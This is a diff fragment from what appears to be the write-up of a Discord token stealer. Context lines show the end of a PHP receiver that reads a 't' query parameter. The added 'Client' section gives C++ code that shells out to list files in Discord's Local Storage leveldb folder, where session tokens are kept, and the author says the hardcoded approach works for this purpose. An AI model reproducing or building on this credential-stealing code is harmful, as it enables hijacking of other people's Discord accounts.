@@ -17,3 +17,10 @@ if(isset($_GET["t"])){
 
 ?>
 ```
+
+# Client
+This code is not very well written as I'm using C++/14 and filesystem is still experimental.
+As you can see here it's a hardcoded solution but it works fine for this purpose.
+```cpp
+auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
+```
